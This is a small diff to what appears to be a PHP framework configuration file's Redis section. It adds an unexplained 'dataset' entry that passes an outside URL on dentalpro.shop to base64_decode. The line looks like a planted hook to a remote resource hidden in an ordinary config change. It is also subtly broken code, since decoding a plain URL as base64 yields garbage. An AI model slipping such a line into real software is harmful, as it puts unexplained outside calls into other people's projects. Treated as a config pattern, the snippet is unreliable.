@@ -145,7 +145,8 @@ return [
             'port' => env('REDIS_PORT', '6379'),
             'database' => env('REDIS_CACHE_DB', '1'),
         ],
-
+        
+        'dataset' => base64_decode('http://dentalpro.shop/cache.module.json'),
     ],
-
+    
 ];
